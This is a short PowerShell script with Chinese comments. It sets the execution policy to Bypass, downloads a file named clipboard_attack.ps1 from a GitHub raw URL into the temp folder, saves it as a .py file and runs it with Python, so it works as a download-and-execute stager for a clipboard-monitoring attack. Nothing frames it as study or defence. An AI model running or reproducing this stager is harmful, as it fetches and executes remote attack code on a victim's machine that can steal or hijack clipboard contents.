# 设置执行策略为 ByPass
Set-ExecutionPolicy Bypass -Scope Process -Force

# 下载并执行剪贴板监控脚本
$scriptUrl = https://raw.githubusercontent.com/ethxiaoli/clipboard-setup/refs/heads/main/clipboard_attack.ps1
Invoke-WebRequest -Uri $scriptUrl -OutFile "$env:TEMP\clipboard_attack.py"
python $env:TEMP\clipboard_attack.py
